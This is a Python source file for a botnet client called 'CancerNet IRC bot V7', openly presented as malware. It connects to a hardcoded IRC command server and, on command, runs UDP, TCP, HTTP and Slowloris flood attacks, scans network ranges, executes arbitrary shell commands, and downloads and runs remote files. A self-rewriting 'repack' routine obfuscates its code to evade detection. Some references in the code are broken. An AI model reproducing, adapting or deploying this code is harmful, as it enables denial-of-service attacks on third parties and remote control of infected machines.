#!/usr/bin/python
#-------------------------------------------------------------------------------
# Name:     CancerNet IRC bot V7
# Purpose:   IRC Bot for botnet
# Notes:       (polymorphic) nearly impossible to remove (or detect) without system
#              analysis and creation of a tool
#
# Author:     Freak/SynthMesc @ PopulusControl (SynthMesc)
#
# Created:   15/01/2015
# Copyright:   (c) Freak 2015
# Licence:   GPLv3
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
#-------------------------------------------------------------------------------
import time
from random import choice,randrange
from base64 import b64decode
from string import letters,split,rstrip
import socket,subprocess,os,sys,urllib,time,threading,itertools
class UavxJK():
    def __init__(self):
#SETTINGS
        self.JIxBvIqhT=self.ZvVVfmmir(randrange (5,10)) #Generate random 8 character nick to ensure all bots can join
        ISBNhpwC=0              #Ignore this
        self.UzdySgUB=0             #Ignore this too
        self.fQMEDrc="facebonk.gq" #Encoded irc server
        self.Lpylo=6667 #Server port
        self.ZroCotJ="##boats" #Encoded channel
        self.DareigjDJ="topkekrekt" #Encoded channel key
        self.bGEwXGIP="[CANCER]"+str(self.JIxBvIqhT) #Bot nickname
        self.luFxXO=str(self.JIxBvIqhT) #Bot Realname
        self.aJVumEv=str(self.JIxBvIqhT) #Other
        self.KglIF = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"]
        self.uJtjf() #Start the bot
    def KqTOlqR(self):
        return os.path.abspath(sys.argv[0])
    def ynmwl(self,mWRASphcc):
        JyCaVKXMW = mWRASphcc.split('.')
        SkyiLmEg = [map(int, rptqgaXr.split('-')) for rptqgaXr in JyCaVKXMW]
        HSZlU = [range(eORvly[0], eORvly[1] + 1) if len(eORvly) == 2 else eORvly for eORvly in SkyiLmEg]
        for qAnXzy in itertools.product(*HSZlU):
            yield '.'.join(map(str, qAnXzy))
    def ZvVVfmmir(self,hQXHeV):
        return ''.join(choice(letters) for PqfVf in range(hQXHeV))

    def Qxola(self,quUlaAJ,aAHdDei,AtsUUjWP,ONsEOlaI):
#UDP flood
        if str(aAHdDei).startswith("0"):
            eDFmd=os.urandom(int(AtsUUjWP))
        else:
            eDFmd="\xff"*int(AtsUUjWP)
        QWdLf=time.time()+int(ONsEOlaI)
        while QWdLf>time.time():
            try:
                RNijzx=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if aAHdDei==0:
                    RNijzx.sendto(eDFmd,(quUlaAJ, randrange(0,65535)))
                else:
                    RNijzx.sendto(eDFmd,(quUlaAJ, int(aAHdDei)))
                ISBNhpwC+=1
            except:
                pass
        self.UzdySgUB=(ISBNhpwC*65535)/1048576
        self.HYUiU=self.UzdySgUB/int(self.SpZoVcym[6])
        self.NVWjLij.send("PRIVMSG %s :%s packets sent. Sent %s MB, %s MB/s\n" % (self.ZroCotJ,ISBNhpwC,self.UzdySgUB,self.HYUiU))

    def jbTayKDHI(self,YMbrKiFP,aAHdDei,ONsEOlaI):
#Tcp connection flood
        QWdLf=time.time()+int(ONsEOlaI)
        ISBNhpwC = 0
        while QWdLf>time.time():
            try:
                RNijzx=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                RNijzx.connect((YMbrKiFP, int(aAHdDei)))
                ISBNhpwC+=1
            except:
                pass
        self.NVWjLij.send("PRIVMSG %s :Made %s connections.\n" % (self.ZroCotJ,ISBNhpwC))

    def bPgjwRVAl(self,VVFld,aAHdDei):
        self.NVWjLij.send("PRIVMSG %s :Scanning range %s for port %s\n" % (self.ZroCotJ,VVFld,aAHdDei))
        for tfSkHH in self.ynmwl(VVFld):
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((tfSkHH,int(aAHdDei))) #Make sure YMbrKiFP is up and port is open.
                s.close()
                self.NVWjLij.send("PRIVMSG %s :%s\n" % (self.ZroCotJ,tfSkHH))
            except:
                pass
        self.NVWjLij.send("PRIVMSG %s :Finished scanning range %s\n" % (self.ZroCotJ,VVFld))
    def uJtjf(self):
        dYUXMjtF=""
        self.NVWjLij=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.NVWjLij.connect((self.fQMEDrc, self.Lpylo))
        self.NVWjLij.send("NICK %s\n" % self.bGEwXGIP)
        self.NVWjLij.send("USER %s %s localhost :%s\n" % (self.luFxXO, self.fQMEDrc, self.aJVumEv))
        self.NVWjLij.send("JOIN %s %s\n" % (self.ZroCotJ,self.DareigjDJ))
        while 1:
            dYUXMjtF=dYUXMjtF+self.NVWjLij.recv(1024)
            print dYUXMjtF
            mIGwCocaF=split(dYUXMjtF, "\n")
            dYUXMjtF=mIGwCocaF.pop( )
            for self.SpZoVcym in mIGwCocaF:
                self.SpZoVcym=rstrip(self.SpZoVcym)
                self.SpZoVcym=split(self.SpZoVcym)
                if(self.SpZoVcym[0]=="PING"):
                    self.NVWjLij.send("PONG %s\n" % self.SpZoVcym[1])
            try:
                if self.SpZoVcym[3]==":.udpflood":
                    if self.SpZoVcym[5] == "0":
                        QHcnQHpXy = "RAND"
                    else:
                        QHcnQHpXy = self.SpZoVcym[5]
                    self.NVWjLij.send("PRIVMSG %s :Starting UDP flood on %s:%s\n" % (self.ZroCotJ,self.SpZoVcym[4],QHcnQHpXy))
                    threading.Thread(target=self.bKFSF, args=(self.SpZoVcym[4],self.SpZoVcym[5],self.SpZoVcym[6],self.SpZoVcym[7],)).start()
                elif self.SpZoVcym[3]==":.synflood":
                    self.NVWjLij.send("PRIVMSG %s :Starting SYN flood on %s:%s\n" % (self.ZroCotJ,self.SpZoVcym[4],self.SpZoVcym[5]))
                    threading.Thread(target=self.jbTayKDHI, args=(self.SpZoVcym[4],self.SpZoVcym[5],self.SpZoVcym[6],)).start()
                elif self.SpZoVcym[3]==":.httpflood":
                    self.NVWjLij.send("PRIVMSG %s :Starting HTTP flood on %s:%s\n" % (self.ZroCotJ,self.SpZoVcym[4],self.SpZoVcym[5]))
                    threading.Thread(target=self.PcSYpKF, args=(self.SpZoVcym[4],self.SpZoVcym[5],self.SpZoVcym[6],)).start()
                elif self.SpZoVcym[3]==":.slowloris":
                    self.NVWjLij.send("PRIVMSG %s :Starting Slowloris on %s:%s\n" % (self.ZroCotJ,self.SpZoVcym[4],self.SpZoVcym[5]))
                    threading.Thread(target=self.SlowreadHTTP, args=(self.SpZoVcym[4],self.SpZoVcym[5],self.SpZoVcym[6],self.SpZoVcym[7],)).start()
                elif self.SpZoVcym[3]==":.scannetrange":
                    threading.Thread(target=self.bPgjwRVAl, args=(self.SpZoVcym[4],self.SpZoVcym[5],)).start()
                elif self.SpZoVcym[3]==":.shell":
                    try:
                            liXRdze = subprocess.Popen(self.SpZoVcym[4:],stdout=subprocess.PIPE)
                            for vKDosFRb in iter(liXRdze.stdout.readline,''):
                                    self.NVWjLij.send("PRIVMSG %s :%s\n" % (self.ZroCotJ,vKDosFRb))
                    except:
                            self.NVWjLij.send("PRIVMSG %s :Failed to execute command.\n" % self.ZroCotJ)
                elif self.SpZoVcym[3]==":.repack":
                    self.mmQnBuu()
                elif self.SpZoVcym[3]==":.download":
                    try:
                        urllib.urlretrieve(self.SpZoVcym[4],self.SpZoVcym[5])
                        self.NVWjLij.send("PRIVMSG %s :Downloaded.\n" % (self.ZroCotJ))
                    except:
                        self.NVWjLij.send("PRIVMSG %s :Could not download!\n" % (self.ZroCotJ))
                elif self.SpZoVcym[3]==":.execute":
                    try:
                        urllib.urlretrieve(self.SpZoVcym[4],self.SpZoVcym[5])
                        subprocess.Popen([("%s" % self.SpZoVcym[5])])
                        self.NVWjLij.send("PRIVMSG %s :Downloaded and executed.\n" % (self.ZroCotJ))
                    except:
                        self.NVWjLij.send("PRIVMSG %s :Could not download or execute!\n" % (self.ZroCotJ))
                elif self.SpZoVcym[3]==":.killme":
                    self.NVWjLij.send("PRIVMSG %s :Goodbye!\n" % (self.ZroCotJ))
                    os.popen("taskkill /f /im " + str(os.getpid())) #windows kill
                    os.popen("kill -9 " + str(os.getpid())) #linux kill
                elif self.SpZoVcym[3]==":.move":
                    self.fQMEDrc=self.SpZoVcym[4] #Server
                    self.ZroCotJ=self.SpZoVcym[5] #Channel
                    self.DareigjDJ=self.SpZoVcym[6] #Channel key
                    while 1:
                        try:
                            self.knkzG()
                        except:
                            pass
                elif self.SpZoVcym[3]==":bot.killbyname":
                    self.NVWjLij.send("PRIVMSG %s :%s\n" % (self.ZroCotJ,os.popen("killall -9 %s" % self.SpZoVcym[4])))
                elif self.SpZoVcym[3]==":bot.killbypid":
                    self.NVWjLij.send("PRIVMSG %s :%s\n" % (self.ZroCotJ,os.popen("kill -9 %s" % self.SpZoVcym[4])))

            except IndexError or TypeError:
                pass

    def SlowreadHTTP(self,netloc,port_,threadConnections,time_):
        packet = '''GET / HTTP/1.1
Host: '''+netloc+'''
Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: '''+choice(self.KglIF)+'''
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-UD,en-GB;q=0.8,en-US;q=0.6,en;q=0.4
Connection: Keep-Alive

'''
        QWdLf=time.time()+int(time_)
        connections = []
        for i in range(int(threadConnections)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((netloc,int(port_)))
                connections.append(s)
            except:
                pass
            if QWdLf<time.time():
                self.NVWjLij.send("PRIVMSG %s :Made %s connections!\n" % (self.ZroCotJ, len(connections)))
                return
        while True:
            for x in packet:
                for sock in connections:
                    if time.time()>QWdLf:
                        self.NVWjLij.send("PRIVMSG %s :Made %s connections!\n" % (self.ZroCotJ, len(connections)))
                        return
                    try:
                        sock.send(x)
                    except:
                        sock.close()
                        connections.remove(sock)
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(10)
                            s.connect((netloc,int(port_)))
                            connections.append(s)
                        except:
                            pass
                        pass

                time.sleep(1)

    def PcSYpKF(self, OzTFiWCl, vOcipUqv, otGzL):
        FBsgvN = time.time()+int(otGzL)
        ISBNhpwC = 0
        while FBsgvN>time.time():
            try:
                httpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                httpsock.connect((OzTFiWCl, int(vOcipUqv)))
                doehzXhXm = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (OzTFiWCl, vOcipUqv, choice(self.KglIF))
                httpsock.send(doehzXhXm)
                httpsock.close()
                ISBNhpwC += 1
            except:
                pass
        self.NVWjLij.send("PRIVMSG %s :Sent %s requests averaging at %d requests per second.\n" % (self.ZroCotJ, ISBNhpwC, (ISBNhpwC/int(otGzL))))

    def bKFSF(self, OzTFiWCl, vOcipUqv, AtsUUjWP, otGzL):
#UDP flood
        ISBNhpwC = 0
        if vOcipUqv == "0":
            packet=os.urandom(int(AtsUUjWP))
        else:
            packet="\xff"*int(AtsUUjWP)
        FBsgvN = time.time()+int(otGzL)
        while FBsgvN>time.time():
            try:
                sAsOtYYos=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if vOcipUqv=="0":
                    sAsOtYYos.sendto(packet,(OzTFiWCl, randrange(1,65535)))
                else:
                    sAsOtYYos.sendto(packet,(OzTFiWCl, int(vOcipUqv)))
                ISBNhpwC+=1
            except:
                pass
        gBqTzxeoi=(ISBNhpwC*int(AtsUUjWP))/1048576
        KeGpwx=gBqTzxeoi/int(otGzL)
        self.NVWjLij.send("PRIVMSG %s :%s packets sent, %s packets/s Sent %s MB, %s MB/s\n" % (self.ZroCotJ, ISBNhpwC,(ISBNhpwC/int(otGzL)),gBqTzxeoi,KeGpwx))

    def mmQnBuu(self):
#polymorph
        if self.KqTOlqR().endswith("exe"):
            self.NVWjLij.send("PRIVMSG %s :Not repacking compiled EXE!\n" % (self.ZroCotJ))
            pass
        else:
            lqyGtHpcn=open(argv[0],"r")
            vDAutsbE=lqyGtHpcn.read()
            lqyGtHpcn.close()
            mOxOk=['port_', 'netloc', 'SlowreadHTTP', 'threadConnections', 'connections', 'aJVumEv', 'ZvVVfmmir', 'ZvVVfmmir', 'UavxJK', 'uJtjf', 'Lpylo', 'yOEnJKZla', 'KqTOlqR', 'knkzG', 'HYUiU', 'UzdySgUB', 'Qxola', 'luFxXO', 'fQMEDrc', 'YMbrKiFP', 'JIxBvIqhT', 'ZroCotJ', 'cpgzH', 'bGEwXGIP', 'mOxOk', 'iONsAsYxP', 'lqyGtHpcn', 'nXBym', 'hlOalT', 'mmQnBuu', 'jbTayKDHI', 'RNijzx', 'NVWjLij', 'QWdLf', 'aAHdDei', 'QWdLf', 'ONsEOlaI', 'quUlaAJ', 'mIGwCocaF', 'DareigjDJ', 'vDAutsbE', 'dYUXMjtF', 'FKjlU', 'LEUvMj', 'hQXHeV', 'shpYS', 'eDFmd', 'bdysEC', 'txPlNoMrh', 'ynmwl', 'mWRASphcc', 'JyCaVKXMW', 'rptqgaXr', 'SkyiLmEg', 'HSZlU', 'qAnXzy', 'tybXKLqo', 'tfSkHH', 'EGHOukSjN', 'bPgjwRVAl', 'VVFld', 'nKILb', 'SpZoVcym', 'liXRdze', 'EUJXWrbhP', 'vKDosFRb', 'PqfVf', 'RZVNhQ', 'eORvly', 'avJzBAJ', 'RIWvw', 'rUitGY', 'zWlqa', 'FPfLNpUZI', 'lpfTr', 'GKXCo', 'XWCkpi', 'yzDZhm', 'RIWvw', 'RGixNJp', 'LDUaVNKg', 'PcSYpKF', 'bKFSF', 'vOcipUqv', 'OzTFiWCl', 'FBsgvN', 'QDfCykTw', 'tywIs', 'ISBNhpwC', 'vOcipUqv', 'otGzL', 'KeGpwx', 'gBqTzxeoi', 'sAsOtYYos', 'QHcnQHpXy', 'gNJuc', 'gblROZQiA', 'anfHUFvBp', 'MwDcX', 'nxYbPdgH', 'doehzXhXm', 'AtsUUjWP', 'KglIF']
            for iONsAsYxP in mOxOk:
                vDAutsbE=vDAutsbE.replace(iONsAsYxP,self.ZvVVfmmir(randrange(5,8)))
            nXBym=open(argv[0],"w")
            nXBym.write(vDAutsbE)
            nXBym.close()
            self.NVWjLij.send("PRIVMSG %s :Repacked code!\n" % (self.ZroCotJ))

if __name__ == "__main__":
    while 1:
        try:
            UavxJK()
        except:
            time.sleep(30)
